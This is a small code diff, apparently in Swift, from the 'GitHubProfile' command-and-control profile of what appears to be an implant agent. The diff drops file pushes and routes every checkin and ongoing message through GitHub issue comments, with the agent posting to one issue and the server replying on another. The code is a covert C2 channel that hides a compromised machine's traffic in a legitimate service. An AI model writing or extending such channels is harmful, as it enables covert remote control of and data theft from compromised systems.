@@ -32,19 +32,11 @@ class GitHubProfile: C2Profile {
     }
     
     // Send data through GitHub
-    // Uses issue comments for initial checkin, then file pushes for ongoing comms
+    // Uses issue comments for all communication (checkin and ongoing)
     func send(data: String) -> String {
-        if !isCheckedIn {
-            // Initial checkin uses issue comments
-            let result = sendViaIssueComment(data: data)
-            if result != "NO_CONNECT" {
-                isCheckedIn = true
-            }
-            return result
-        } else {
-            // Ongoing communication uses file pushes
-            return sendViaFilePush(data: data)
-        }
+        // All communication uses issue comments
+        // Agent posts to client_issue, server responds on server_issue
+        return sendViaIssueComment(data: data)
     }
     
     // Send message via GitHub issue comment (used for initial checkin)
